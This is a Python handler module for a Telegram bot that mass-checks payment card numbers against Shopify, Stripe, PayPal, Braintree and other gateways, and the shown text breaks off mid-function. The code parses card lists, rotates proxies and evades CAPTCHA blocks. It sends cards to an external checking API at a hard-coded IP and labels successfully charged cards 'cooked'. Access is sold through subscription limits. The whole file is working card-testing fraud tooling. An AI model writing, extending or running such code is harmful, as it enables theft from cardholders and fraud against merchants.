# complete_handler.py – FINAL VERSION with Onyx gates, 200‑card limit for non‑owners, live progress,
# and now temporary API integration for Shopify mass checks.

import requests
import time
import threading
import random
import logging
import re
import csv
import os
import urllib3
import traceback
import json
import base64
from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError as FutureTimeoutError
from telebot import types
from datetime import datetime, date
from requests_toolbelt import MultipartEncoder

# Import all gate functions from gates.py
from gates import (
    check_paypal_fixed, check_paypal_general, PAYPAL_AMOUNT,
    check_stripe_api,
    check_razorpay, check_braintree, check_paypal_onyx, check_sk_gateway,
    check_stripe_onyx, check_app_auth, check_chaos, check_adyen, check_payflow,
    check_random, check_shopify_onyx, check_skrill, check_arcenus, check_random_stripe,
    check_payu
)

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

OWNER_ID = [5963548505, 1614278744]

# ============================================================================
# RATE LIMITER (prevents 429 errors)
# ============================================================================
class RateLimiter:
    def __init__(self, max_calls=25, period=1.0):
        self.max_calls = max_calls
        self.period = period
        self.calls = []
        self.lock = threading.Lock()

    def wait(self):
        with self.lock:
            now = time.time()
            self.calls = [t for t in self.calls if t > now - self.period]
            if len(self.calls) >= self.max_calls:
                sleep_time = self.calls[0] + self.period - now
                if sleep_time > 0:
                    time.sleep(sleep_time)
            self.calls.append(time.time())

rate_limiter = RateLimiter()

from telebot.apihelper import ApiTelegramException

def safe_send(bot_func, *args, **kwargs):
    rate_limiter.wait()
    while True:
        try:
            return bot_func(*args, **kwargs)
        except ApiTelegramException as e:
            if e.error_code == 429:
                retry_after = e.result_json.get('parameters', {}).get('retry_after', 5)
                logger.warning(f"Rate limited (429). Waiting {retry_after} seconds.")
                time.sleep(retry_after)
                rate_limiter.wait()
                continue
            else:
                raise

# ============================================================================
# STOP COMMAND HANDLING
# ============================================================================
stop_events = {}
stop_lock = threading.Lock()

def set_stop(chat_id):
    with stop_lock:
        stop_events[chat_id] = True

def clear_stop(chat_id):
    with stop_lock:
        stop_events.pop(chat_id, None)

def is_stop_requested(chat_id):
    with stop_lock:
        return stop_events.get(chat_id, False)

# ============================================================================
# CONCURRENCY CONTROL – PER USER + GLOBAL
# ============================================================================
user_busy = {}
user_busy_lock = threading.Lock()

def is_user_busy(user_id):
    with user_busy_lock:
        return user_busy.get(user_id, False)

def set_user_busy(user_id, busy):
    with user_busy_lock:
        user_busy[user_id] = busy

MAX_CONCURRENT_CHECKS = 3
mass_check_semaphore = threading.Semaphore(MAX_CONCURRENT_CHECKS)

# ============================================================================
# PROXY CHECKING + CACHE
# ============================================================================
proxy_cache = {}
proxy_cache_lock = threading.Lock()
PROXY_CACHE_TTL = 300  # 5 minutes

def check_proxy_live(proxy):
    try:
        parts = proxy.strip().split(':')
        if len(parts) == 2:
            formatted = f"http://{parts[0]}:{parts[1]}"
        elif len(parts) == 4:
            formatted = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        else:
            return None
        proxies_dict = {'http': formatted, 'https': formatted}
        r = requests.get("http://httpbin.org/ip", proxies=proxies_dict, timeout=5, verify=False)
        if r.status_code == 200:
            return proxy
    except:
        pass
    return None

def validate_proxies_strict(proxies, bot, message):
    if not proxies:
        return []
    live_proxies = []
    now = time.time()
    to_test = []
    with proxy_cache_lock:
        for p in proxies:
            if p in proxy_cache and now - proxy_cache[p]['time'] < PROXY_CACHE_TTL:
                if proxy_cache[p]['live']:
                    live_proxies.append(p)
            else:
                to_test.append(p)
    if not to_test:
        return live_proxies
    total_to_test = len(to_test)
    status_msg = safe_send(bot.send_message, message.chat.id, f"🛡️ <b>Verifying {total_to_test} Proxies...</b>", parse_mode='HTML')
    last_ui_update = time.time()
    tested = 0
    newly_live = []
    with ThreadPoolExecutor(max_workers=15) as executor:
        futures = {executor.submit(check_proxy_live, p): p for p in to_test}
        for future in as_completed(futures):
            tested += 1
            p = futures[future]
            result = future.result()
            with proxy_cache_lock:
                proxy_cache[p] = {'live': bool(result), 'time': now}
            if result:
                newly_live.append(p)
            if time.time() - last_ui_update > 2:
                try:
                    safe_send(bot.edit_message_text,
                        f"🛡️ <b>Verifying Proxies</b>\n✅ Live: {len(live_proxies)+len(newly_live)}\n💀 Dead: {tested - len(newly_live)}\n📊 {tested}/{total_to_test}",
                        message.chat.id, status_msg.message_id, parse_mode='HTML')
                    last_ui_update = time.time()
                except:
                    pass
    try:
        safe_send(bot.delete_message, message.chat.id, status_msg.message_id)
    except:
        pass
    live_proxies.extend(newly_live)
    return live_proxies

# ============================================================================
# LOGGING
# ============================================================================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - [%(levelname)s] - %(message)s',
    datefmt='%H:%M:%S'
)
logger = logging.getLogger(__name__)

# ============================================================================
# BIN DATABASE
# ============================================================================
BINS_CSV_FILE = 'bins_all.csv'
BIN_DB = {}

def load_bin_database():
    global BIN_DB
    if not os.path.exists(BINS_CSV_FILE):
        logger.warning(f"⚠️ System: BIN CSV file '{BINS_CSV_FILE}' not found.")
        return
    try:
        with open(BINS_CSV_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            reader = csv.reader(f)
            next(reader, None)
            for row in reader:
                if len(row) >= 6:
                    BIN_DB[row[0].strip()] = {
                        'country_name': row[1].strip(),
                        'country_flag': get_flag_emoji(row[1].strip()),
                        'brand': row[2].strip(),
                        'type': row[3].strip(),
                        'level': row[4].strip(),
                        'bank': row[5].strip()
                    }
    except Exception as e:
        logger.error(f"❌ Error loading BIN CSV: {e}")

def get_flag_emoji(country_code):
    if not country_code or len(country_code) != 2: return "🇺🇳"
    return "".join([chr(ord(c.upper()) + 127397) for c in country_code])

load_bin_database()

# ============================================================================
# HELPER FUNCTIONS
# ============================================================================
def get_bin_info(card_number):
    clean_cc = re.sub(r'\D', '', str(card_number))
    bin_code = clean_cc[:6]
    if bin_code in BIN_DB:
        return BIN_DB[bin_code]
    try:
        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_code}", timeout=3)
        if response.status_code == 200:
            data = response.json()
            return {
                'country_name': data.get('country_name', 'Unknown'),
                'country_flag': data.get('country_flag', '🇺🇳'),
                'brand': data.get('brand', 'Unknown'),
                'type': data.get('type', 'Unknown'),
                'level': data.get('level', 'Unknown'),
                'bank': data.get('bank', 'Unknown')
            }
    except:
        pass
    return {'country_name': 'Unknown', 'country_flag': '🇺🇳', 'bank': 'UNKNOWN', 'brand': 'UNKNOWN', 'type': 'UNKNOWN', 'level': 'UNKNOWN'}

def extract_cards_from_text(text):
    valid_ccs = []
    text = text.replace(',', '\n').replace(';', '\n')
    lines = text.split('\n')
    for line in lines:
        line = line.strip()
        if len(line) < 15: continue
        match = re.search(r'(\d{13,19})[|:/\s](\d{1,2})[|:/\s](\d{2,4})[|:/\s](\d{3,4})', line)
        if match:
            cc, mm, yyyy, cvv = match.groups()
            if len(yyyy) == 2: yyyy = "20" + yyyy
            mm = mm.zfill(2)
            if 1 <= int(mm) <= 12:
                valid_ccs.append(f"{cc}|{mm}|{yyyy}|{cvv}")
    return list(set(valid_ccs))

def create_progress_bar(processed, total, length=15):
    if total == 0: return ""
    percent = processed / total
    filled_length = int(length * percent)
    return f"<code>{'█' * filled_length}{'░' * (length - filled_length)}</code> {int(percent * 100)}%"

# ============================================================================
# USAGE TRACKING
# ============================================================================
def reset_usage_if_needed(user_data):
    today = date.today().isoformat()
    if user_data.get('last_usage_reset') != today:
        user_data['usage_today'] = 0
        user_data['last_usage_reset'] = today

def get_user_upload_limit(user_id, users_data):
    user_str = str(user_id)
    user_info = users_data.get(user_str, {})
    if not user_info:
        return 50000
    limit = user_info.get('limit', 50000)
    return 50000 if limit <= 0 else limit

def get_user_daily_remaining(user_id, users_data):
    user_str = str(user_id)
    user_info = users_data.get(user_str, {})
    if not user_info:
        return 100000
    reset_usage_if_needed(user_info)
    daily_limit = user_info.get('daily_limit', 100000)
    used = user_info.get('usage_today', 0)
    return max(0, daily_limit - used)

def increment_usage(user_id, amount, users_data, save_json_func, users_file):
    user_str = str(user_id)
    user_info = users_data.get(user_str)
    if not user_info:
        return
    reset_usage_if_needed(user_info)
    user_info['usage_today'] = user_info.get('usage_today', 0) + amount
    save_json_func(users_file, users_data)

# ============================================================================
# PERSONAL SITES HANDLING (loaded from user_sites.json)
# ============================================================================
USER_SITES_FILE = "user_sites.json"

def load_user_sites():
    try:
        with open(USER_SITES_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_user_sites(data):
    with open(USER_SITES_FILE, 'w') as f:
        json.dump(data, f, indent=2)

def get_user_sites(user_id):
    data = load_user_sites()
    return data.get(str(user_id), [])

def save_user_sites_list(user_id, sites_list):
    data = load_user_sites()
    data[str(user_id)] = sites_list
    save_user_sites(data)

# ============================================================================
# TEMPORARY API INTEGRATION FOR SHOPIFY CHECKS
# ============================================================================
API_BASE_URL = "http://49.12.210.122:5000/check"

def api_check_site(site_url, cc, proxy=None):
    """
    Calls the external API to check a card on a Shopify site.
    Returns the JSON response or raises an exception.
    """
    params = {
        'card': cc,
        'site': site_url
    }
    if proxy:
        params['proxy'] = proxy
    try:
        # Use a timeout of 15 seconds (adjust as needed)
        r = requests.get(API_BASE_URL, params=params, timeout=15, verify=False)
        r.raise_for_status()
        return r.json()
    except Exception as e:
        # Return an error dict that can be processed uniformly
        return {'status': 'error', 'message': str(e)}

def process_api_response(api_response, price):
    """
    Converts the API response into the format expected by the mass‑check engine.
    Returns (response_text, status, gateway).
    """
    status_raw = api_response.get('status', 'error').upper()
    message = api_response.get('message', 'No message')
    # Treat 'APPROVED' as cooked, 'DECLINED' as dead, everything else as error
    if status_raw == 'APPROVED':
        return message, 'APPROVED', 'API'
    elif status_raw == 'DECLINED':
        return message, 'DECLINED', 'API'
    else:
        return message, 'ERROR', 'API'

# ============================================================================
# MASS CHECK ENGINE FOR API (Shopify only)
# ============================================================================
def process_api_mass_check(bot, message, start_msg, ccs, site_list, proxies,
                           user_id, users_data, save_json_func, users_file, hit_pref="both"):
    """
    Performs a mass check using the external API.
    """
    total = len(ccs)
    results = {"live": [], "dead": [], "error": [], "approved": [], "cooked": []}
    error_cards = []
    chat_id = message.chat.id
    sites_lock = threading.Lock()
    temp_site_ban = {}
    TEMP_BAN_TIME = 120
    current_sites = site_list.copy()
    current_proxies = proxies.copy()
    clear_stop(chat_id)

    def get_bin_info_local(card_number):
        return get_bin_info(card_number)

    def error_result(cc, reason):
        return {
            'cc': cc, 'response': reason, 'status': 'ERROR', 'gateway': 'Unknown',
            'price': '0.00', 'site': 'N/A', 'site_url': 'N/A', 'proxy_used': None,
            'bin_info': get_bin_info_local(cc.split('|')[0]), 'timestamp': datetime.now().isoformat()
        }

    def check_card_concurrent(cc, site_list, proxy_list, max_retries=3):
        try:
            with sites_lock:
                available_sites = []
                now = time.time()
                for s in site_list:
                    url = s['url']
                    if url in temp_site_ban:
                        if now < temp_site_ban[url]:
                            continue
                        else:
                            del temp_site_ban[url]
                    available_sites.append(s)
            if not available_sites:
                return error_result(cc, 'All sites temporarily paused (CAPTCHA cooldown)')
            sites_to_try = random.sample(available_sites, min(max_retries, len(available_sites)))
            for site_obj in sites_to_try:
                site_url = site_obj['url']
                site_name = site_obj.get('name', site_url)
                price = site_obj.get('price', '0.00')
                gateway = site_obj.get('gateway', 'Unknown')
                tried_proxies = []
                for proxy_attempt in range(2):
                    available_proxies = [p for p in proxy_list if p not in tried_proxies]
                    if not available_proxies:
                        break
                    proxy = random.choice(available_proxies)
                    tried_proxies.append(proxy)
                    try:
                        # Call the API
                        api_resp = api_check_site(site_url, cc, proxy)
                        response_text, status, gateway_result = process_api_response(api_resp, price)
                        response_upper = (response_text or "").upper()
                        is_captcha = "CAPTCHA" in response_upper
                        if not is_captcha and status not in ['ERROR', 'TIMEOUT']:
                            bin_info = get_bin_info_local(cc.split('|')[0])
                            return {
                                'cc': cc,
                                'response': response_text,
                                'status': status,
                                'gateway': gateway_result or gateway,
                                'price': price,
                                'site': site_name,
                                'site_url': site_url,
                                'proxy_used': proxy,
                                'bin_info': bin_info,
                                'timestamp': datetime.now().isoformat()
                            }
                        elif is_captcha:
                            with sites_lock:
                                temp_site_ban[site_url] = time.time() + TEMP_BAN_TIME
                            break
                        else:
                            continue
                    except Exception as e:
                        continue
            return error_result(cc, 'All retries failed (Network Timeouts)')
        except Exception as e:
            return error_result(cc, str(e))

    status_msg = start_msg  # already sent
    processed = 0
    start_time = time.time()
    last_update_time = time.time()
    last_card_result = ""

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {}
        for i, cc in enumerate(ccs):
            if is_stop_requested(chat_id):
                error_cards.extend(ccs[i:])
                break
            future = executor.submit(check_card_concurrent, cc, current_sites, current_proxies, 3)
            futures[future] = cc

        for future in as_completed(futures):
            if is_stop_requested(chat_id):
                for f in futures:
                    if not f.done():
                        f.cancel()
            processed += 1
            try:
                res = future.result(timeout=120)
                status = res['status']
                if status == 'STOPPED':
                    results['error'].append(res)
                    error_cards.append(res['cc'])
                    last_card_result = f"⛔ {res['cc'][:16]}... | {res['response']}"
                elif status == 'APPROVED':
                    results['cooked'].append(res)
                    if hit_pref in ["both", "cooked"]:
                        send_hit(bot, chat_id, res, "🔥 COOKED", user_id, hit_pref)
                    last_card_result = f"🔥 {res['cc'][:16]}... | COOKED"
                elif status == 'APPROVED_OTP':
                    results['approved'].append(res)
                    if hit_pref == "both":
                        send_hit(bot, chat_id, res, "✅ APPROVED", user_id, hit_pref)
                    last_card_result = f"✅ {res['cc'][:16]}... | OTP"
                elif status in ['DECLINED', 'EXPIRED']:
                    results['dead'].append(res)
                    last_card_result = f"❌ {res['cc'][:16]}... | {res['response']}"
                else:
                    results['error'].append(res)
                    error_cards.append(res['cc'])
                    last_card_result = f"⚠️ {res['cc'][:16]}... | {res['response']}"
            except FutureTimeoutError:
                cc = futures[future]
                results['error'].append(error_result(cc, 'Card check timeout (>120s)'))
                error_cards.append(cc)
                last_card_result = f"⏱️ {cc[:16]}... | TIMEOUT"
            except Exception as e:
                cc = futures[future]
                results['error'].append(error_result(cc, str(e)))
                error_cards.append(cc)
                last_card_result = f"⚠️ {cc[:16]}... | {str(e)[:30]}"

            # Update progress every 10 seconds
            if time.time() - last_update_time > 10.0 or processed == total or is_stop_requested(chat_id):
                try:
                    elapsed = time.time() - start_time
                    cpm = (processed / elapsed) * 60 if elapsed > 0 else 0
                    avg_time = elapsed / processed if processed > 0 else 0
                    progress = create_progress_bar(processed, total)
                    msg_text = (f"<b>⚡ API‑Powered Shopify Multi‑Site Checking...</b>\n{progress}\n"
                                f"📊 <b>Progress:</b> {processed}/{total}\n"
                                f"🔥 <b>Cooked:</b> {len(results.get('cooked', []))}\n"
                                f"✅ <b>Approved:</b> {len(results.get('approved', []))}\n"
                                f"❌ <b>Dead:</b> {len(results.get('dead', []))}\n"
                                f"⚠️ <b>Errors:</b> {len(results.get('error', []))}\n"
                                f"⚡ <b>CPM:</b> {cpm:.1f}\n"
                                f"⏱️ <b>Avg Time:</b> {avg_time:.1f}s/card\n"
                                f"📌 <b>Last:</b> {last_card_result}")
                    safe_send(bot.edit_message_text, msg_text, chat_id, status_msg.message_id, parse_mode="HTML")
                    last_update_time = time.time()
                except:
                    pass

            if is_stop_requested(chat_id):
                break

    clear_stop(chat_id)
    increment_usage(user_id, processed, users_data, save_json_func, users_file)

    duration = time.time() - start_time
    final_text = (f"<b>✅ API‑Powered Shopify Multi‑Site Completed</b>\n━━━━━━━━━━━━━━━━\n"
                  f"💳 <b>Total Checked:</b> {processed}\n"
                  f"🔥 <b>Cooked:</b> {len(results.get('cooked', []))}\n"
                  f"✅ <b>Approved:</b> {len(results.get('approved', []))}\n"
                  f"❌ <b>Dead:</b> {len(results.get('dead', []))}\n"
                  f"⚠️ <b>Errors:</b> {len(results.get('error', []))}\n"
                  f"⏱️ <b>Time Taken:</b> {duration:.2f}s")
    try:
        safe_send(bot.edit_message_text, final_text, chat_id, status_msg.message_id, parse_mode="HTML")
    except:
        safe_send(bot.send_message, chat_id, final_text, parse_mode="HTML")

    if error_cards and len(error_cards) < total:
        content = "\n".join(error_cards)
        filename = f"error_cards_{chat_id}.txt"
        with open(filename, 'w') as f:
            f.write(content)
        with open(filename, 'rb') as f:
            safe_send(bot.send_document, chat_id, f, caption="⚠️ Cards that were not processed successfully – you may recheck these.")
        os.remove(filename)

# ============================================================================
# MAIN HANDLER SETUP
# ============================================================================
def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
                          check_site_func, is_valid_response_func,
                          process_response_func, update_stats_func,
                          save_json_func, load_json_func,
                          is_user_allowed_func, users_data, users_file,
                          force_subscribe_decorator=None):

    # User session storage (in-memory)
    user_sessions = {}

    # Helper for user proxies
    def get_user_proxies(user_id):
        user_id_str = str(user_id)
        user_proxies = load_json_func("user_proxies.json", {})
        return user_proxies.get(user_id_str, [])

    def save_user_proxies(user_id, proxies_list):
        user_id_str = str(user_id)
        user_proxies = load_json_func("user_proxies.json", {})
        user_proxies[user_id_str] = proxies_list
        save_json_func("user_proxies.json", user_proxies)

    def get_active_proxies(user_id):
        user_id_str = str(user_id)
        # Owners use global proxies
        if user_id in OWNER_ID:
            if proxies_data and 'proxies' in proxies_data and proxies_data['proxies']:
                return proxies_data['proxies']
            return None
        # Check session first
        if user_id in user_sessions and user_sessions[user_id].get('proxies'):
            return user_sessions[user_id]['proxies']
        # Fallback to user's personal proxies
        user_proxies = get_user_proxies(user_id)
        if user_proxies:
            return user_proxies
        return None

    # ========================================================================
    # /cleanmyproxies
    # ========================================================================
    @bot.message_handler(commands=['cleanmyproxies'])
    def handle_clean_my_proxies(message):
        user_id = message.from_user.id
        if not is_user_allowed_func(user_id) and user_id not in OWNER_ID:
            safe_send(bot.reply_to, message, "🚫 Access Denied")
            return
        user_proxies = get_user_proxies(user_id)
        if not user_proxies:
            safe_send(bot.reply_to, message, "You have no personal proxies to clean.")
            return
        safe_send(bot.reply_to, message, f"🧹 Cleaning your {len(user_proxies)} proxies... This may take a moment.")
        def clean_task():
            live = validate_proxies_strict(user_proxies, bot, message)
            if len(live) == len(user_proxies):
                safe_send(bot.send_message, message.chat.id, "✅ All your proxies are live! No dead ones found.")
            else:
                removed = len(user_proxies) - len(live)
                save_user_proxies(user_id, live)
                safe_send(bot.send_message, message.chat.id, f"✅ Cleaning complete!\nRemoved {removed} dead proxies.\nYou now have {len(live)} live proxies.")
        threading.Thread(target=clean_task).start()

    # ========================================================================
    # /stop
    # ========================================================================
    @bot.message_handler(commands=['stop'])
    def handle_stop(message):
        chat_id = message.chat.id
        if is_stop_requested(chat_id):
            safe_send(bot.reply_to, message, "⏸️ Stop already requested. The current check will abort after the current card.")
        else:
            set_stop(chat_id)
            safe_send(bot.reply_to, message, "⏸️ Stop command received. The mass check will abort after the current card finishes.")

    # ========================================================================
    # /msh command – direct card input
    # ========================================================================
    @bot.message_handler(commands=['msh', 'hardcook'])
    def handle_mass_check_command(message):
        user_id = message.from_user.id
        chat_id = message.chat.id

        # 1. Authorization check
        if not is_user_allowed_func(user_id) and user_id not in OWNER_ID:
            safe_send(bot.send_message, chat_id, "🚫 <b>Access Denied</b>\nYour subscription has expired or you are not approved.", parse_mode='HTML')
            return

        # 2. Extract cards from command text (if any)
        text = message.text or ''
        cards_text = None
        parts = text.split(maxsplit=1)
        if len(parts) > 1:
            cards_text = parts[1]

        if cards_text:
            # Parse cards from the message
            ccs = extract_cards_from_text(cards_text)
            if not ccs:
                safe_send(bot.send_message, chat_id, "❌ No valid cards found in your message.\nFormat: `CC|MM|YYYY|CVV`", parse_mode='Markdown')
                return

            # Store in session
            if user_id not in user_sessions:
                user_sessions[user_id] = {}
            user_sessions[user_id]['ccs'] = ccs
        else:
            # No inline cards – check if we have cards from a previous file upload
            if user_id not in user_sessions or 'ccs' not in user_sessions[user_id]:
                safe_send(bot.send_message, chat_id, "⚠️ <b>Upload CCs first!</b>", parse_mode='HTML')
                return
            ccs = user_sessions[user_id]['ccs']

        # 3. Check daily limits (if not owner)
        if user_id not in OWNER_ID:
            remaining = get_user_daily_remaining(user_id, users_data)
            if remaining < len(ccs):
                safe_send(bot.send_message, chat_id,
                    f"❌ <b>Daily Limit Exceeded!</b>\n\nYou have only {remaining} cards left for today.",
                    parse_mode='HTML')
                return

        # 4. Check if already busy
        if is_user_busy(user_id) and user_id not in OWNER_ID:
            safe_send(bot.send_message, chat_id, "⏳ You already have a mass check in progress. Please wait.", parse_mode='HTML')
            return

        # 5. Acquire global semaphore
        if not mass_check_semaphore.acquire(blocking=False):
            safe_send(bot.send_message, chat_id, "⚠️ Too many mass checks running globally. Try again later.", parse_mode='HTML')
            return

        set_user_busy(user_id, True)

        # 6. Get sites (global)
        sites = get_filtered_sites_func()
        if not sites:
            safe_send(bot.send_message, chat_id, "❌ <b>No sites available!</b> Add sites via /addurls", parse_mode='HTML')
            mass_check_semaphore.release()
            set_user_busy(user_id, False)
            return

        # 7. Get proxies
        proxies = get_active_proxies(user_id)
        if not proxies:
            safe_send(bot.send_message, chat_id, "🚫 <b>Proxy Required!</b> Add proxies via /addpro or upload a proxy file.", parse_mode='HTML')
            mass_check_semaphore.release()
            set_user_busy(user_id, False)
            return

        active_proxies = validate_proxies_strict(proxies, bot, message)
        if not active_proxies:
            safe_send(bot.send_message, chat_id, "❌ <b>All your proxies are dead. Please upload working proxies.</b>", parse_mode='HTML')
            mass_check_semaphore.release()
            set_user_busy(user_id, False)
            return

        # 8. Show gate selection (Shopify only for /msh)
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("🛍️ Shopify Multi‑Site", callback_data="run_mass_shopify"),
            types.InlineKeyboardButton("❌ Cancel", callback_data="action_cancel")
        )
        safe_send(bot.send_message, chat_id,
            f"💳 <b>Cards to check:</b> {len(ccs)}\n<b>⚡ Select Gate:</b>",
            reply_markup=markup, parse_mode='HTML')

    # ========================================================================
    # FILE UPLOAD HANDLER (CCs) – with all gates
    # ========================================================================
    def handle_file_upload_event(message):
        user_id = message.from_user.id
        if not is_user_allowed_func(user_id):
            safe_send(bot.reply_to, message, "🚫 <b>Access Denied</b>\nYour subscription has expired or you are not approved.", parse_mode='HTML')
            return

        try:
            file_name = message.document.file_name.lower()
            if not file_name.endswith('.txt'):
                safe_send(bot.reply_to, message, "❌ <b>Format Error:</b> Only .txt files.", parse_mode='HTML')
                return

            msg_loading = safe_send(bot.reply_to, message, "⏳ <b>Reading File...</b>", parse_mode='HTML')
            file_info = bot.get_file(message.document.file_id)
            file_content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')

            ccs = extract_cards_from_text(file_content)

            if not ccs:
                safe_send(bot.edit_message_text, "❌ No valid CCs found.", message.chat.id, msg_loading.message_id)
                return

            # Check user's upload limit
            limit = get_user_upload_limit(user_id, users_data)
            if len(ccs) > limit and user_id not in OWNER_ID:
                safe_send(bot.edit_message_text,
                    f"⚠️ <b>Limit Exceeded!</b>\n\nYour per‑upload limit is <b>{limit}</b> cards.\n"
                    f"You uploaded <b>{len(ccs)}</b> cards.\n<b>Only the first {limit} cards will be checked.</b>",
                    message.chat.id, msg_loading.message_id, parse_mode='HTML')
                ccs = ccs[:limit]
                time.sleep(2)

            if user_id not in user_sessions:
                user_sessions[user_id] = {}
            user_sessions[user_id]['ccs'] = ccs

            # Build markup with all available gates (grouped in two rows)
            markup = types.InlineKeyboardMarkup(row_width=3)
            markup.add(
                types.InlineKeyboardButton("🛍️ Shopify", callback_data="run_mass_shopify"),
                types.InlineKeyboardButton("🛍️ My Sites", callback_data="run_mass_mysites"),
                types.InlineKeyboardButton("💰 PayPal Fixed", callback_data="run_mass_paypal_fixed"),
                types.InlineKeyboardButton("💰 PayPal General", callback_data="run_mass_paypal_general"),
                types.InlineKeyboardButton("💳 Stripe", callback_data="run_mass_stripe"),
                types.InlineKeyboardButton("🌀 Chaos", callback_data="run_mass_chaos"),
                types.InlineKeyboardButton("🔷 Adyen", callback_data="run_mass_adyen"),
                types.InlineKeyboardButton("📱 App Auth", callback_data="run_mass_app_auth"),
                types.InlineKeyboardButton("💸 Payflow", callback_data="run_mass_payflow"),
                types.InlineKeyboardButton("🎲 Random", callback_data="run_mass_random"),
                types.InlineKeyboardButton("🛍️ Shopify (Onyx)", callback_data="run_mass_shopify_onyx"),
                types.InlineKeyboardButton("💰 Skrill", callback_data="run_mass_skrill"),
                types.InlineKeyboardButton("🏦 Braintree", callback_data="run_mass_braintree"),
                types.InlineKeyboardButton("⚡ Stripe (Onyx)", callback_data="run_mass_stripe_onyx"),
                types.InlineKeyboardButton("🌐 Arcenus", callback_data="run_mass_arcenus"),
                types.InlineKeyboardButton("🎲 Random Stripe", callback_data="run_mass_random_stripe"),
                types.InlineKeyboardButton("💳 RazorPay", callback_data="run_mass_razorpay"),
                types.InlineKeyboardButton("🔷 PayU", callback_data="run_mass_payu"),
                types.InlineKeyboardButton("🔑 SK Gateway", callback_data="run_mass_sk_gateway"),
                types.InlineKeyboardButton("💸 PayPal (Onyx)", callback_data="run_mass_paypal_onyx"),
                types.InlineKeyboardButton("❌ Cancel", callback_data="action_cancel")
            )

            safe_send(bot.edit_message_text,
                f"📂 <b>File:</b> <code>{file_name}</code>\n💳 <b>Cards to check:</b> {len(ccs)}\n<b>⚡ Select Checking Gate:</b>",
                message.chat.id, msg_loading.message_id,
                reply_markup=markup, parse_mode='HTML')
            logger.info(f"User {user_id} uploaded {len(ccs)} CCs")

        except Exception as e:
            logger.error(f"File upload error: {traceback.format_exc()}")
            safe_send(bot.reply_to, message, f"❌ Error: {str(e)}")

    if force_subscribe_decorator:
        handle_file_upload_event = force_subscribe_decorator(handle_file_upload_event)
    bot.message_handler(content_types=['document'])(handle_file_upload_event)

    # ========================================================================
    # MASS CHECK CALLBACK HANDLERS
    # ========================================================================
    @bot.callback_query_handler(func=lambda call: call.data == "run_mass_shopify")
    def callback_shopify(call):
        try:
            user_id = call.from_user.id
            if not is_user_allowed_func(user_id):
                safe_send(bot.answer_callback_query, call.id, "🚫 Access Denied! Your subscription has expired or you are not approved.", show_alert=True)
                try: safe_send(bot.delete_message, call.message.chat.id, call.message.message_id)
                except: pass
                return
            try: safe_send(bot.delete_message, call.message.chat.id, call.message.message_id)
            except: pass
            if user_id not in user_sessions or 'ccs' not in user_sessions[user_id]:
                safe_send(bot.send_message, call.message.chat.id, "⚠️ <b>Upload CCs first!</b>", parse_mode='HTML')
                return
            ccs = user_sessions[user_id]['ccs']
            if user_id not in OWNER_ID:
                remaining = get_user_daily_remaining(user_id, users_data)
                if remaining < len(ccs):
                    safe_send(bot.send_message, call.message.chat.id,
                        f"❌ <b>Daily Limit Exceeded!</b>\n\nYou have only {remaining} cards left for today.",
                        parse_mode='HTML')
                    return
            markup = types.InlineKeyboardMarkup(row_width=2)
            markup.add(
                types.InlineKeyboardButton("🔥 Cooked Only", callback_data="shopify_pref_cooked"),
                types.InlineKeyboardButton("✅ Cooked + Approved", callback_data="shopify_pref_both")
            )
            safe_send(bot.send_message,
                call.message.chat.id,
                "┏━━━━━━━⍟\n┃ <b>⚡ SELECT HIT PREFERENCE</b>\n┗━━━━━━━━━━━⊛\n\n"
                "Choose what results you want to receive during the mass check:\n\n"
                "🔥 <b>Cooked Only</b> – only fully charged orders (no OTP notifications)\n"
                "✅ <b>Cooked + Approved</b> – receive both OTP‑required and charged orders",
                parse_mode='HTML', reply_markup=markup)
        except Exception as e:
            logger.error(f"Shopify callback error: {e}")
            safe_send(bot.send_message, call.message.chat.id, f"❌ Error: {e}")

    @bot.callback_query_handler(func=lambda call: call.data.startswith("shopify_pref_"))
    def shopify_pref_callback(call):
        try:
            user_id = call.from_user.id
            pref = call.data.replace("shopify_pref_", "")
            if user_id not in user_sessions:
                user_sessions[user_id] = {}
            user_sessions[user_id]['hit_pref'] = pref
            safe_send(bot.answer_callback_query, call.id, f"Preference set to: {pref}")
            # Determine whether to use global or personal sites
            if pref.endswith("_mysites"):  # from personal sites flow
                sites = user_sessions[user_id].get('personal_sites', [])
                if not sites:
                    safe_send(bot.send_message, call.message.chat.id, "⚠️ No personal sites found. Add some with /addmysite.")
                    return
                start_shopify_mass_check(call.message, user_id, pref.replace("_mysites", ""), sites)
            else:
                sites = get_filtered_sites_func()
                start_shopify_mass_check(call.message, user_id, pref, sites)
        except Exception as e:
            logger.error(f"Preference callback error: {e}")
            safe_send(bot.send_message, call.message.chat.id, f"❌ Error: {e}")

    def start_shopify_mass_check(message, user_id, hit_pref, site_list):
        if user_id not in user_sessions or 'ccs' not in user_sessions[user_id]:
            safe_send(bot.send_message, message.chat.id, "⚠️ Session expired. Upload file again.")
            return
        ccs = user_sessions[user_id]['ccs']
        if is_user_busy(user_id) and user_id not in OWNER_ID:
            safe_send(bot.send_message, message.chat.id, "⏳ You already have a mass check in progress. Please wait.")
            return
        if not mass_check_semaphore.acquire(blocking=False):
            safe_send(bot.send_message, message.chat.id, "⚠️ Too many mass checks running globally. Try again later.")
            return
        set_user_busy(user_id, True)
        if not site_list:
            safe_send(bot.send_message, message.chat.id, "❌ <b>No sites available!</b>")
            mass_check_semaphore.release()
            set_user_busy(user_id, False)
            return
        proxies = get_active_proxies(user_id)
        if not proxies:
            safe_send(bot.send_message, message.chat.id, "🚫 <b>Proxy Required!</b>")
            mass_check_semaphore.release()
            set_user_busy(user_id, False)
            return
        active_proxies = validate_proxies_strict(proxies, bot, message)
        if not active_proxies:
            safe_send(bot.send_message, message.chat.id, "❌ <b>All your proxies are dead. Please upload working proxies.</b>", parse_mode='HTML')
            mass_check_semaphore.release()
            set_user_busy(user_id, False)
            return
        start_msg = safe_send(bot.send_message,
            message.chat.id,
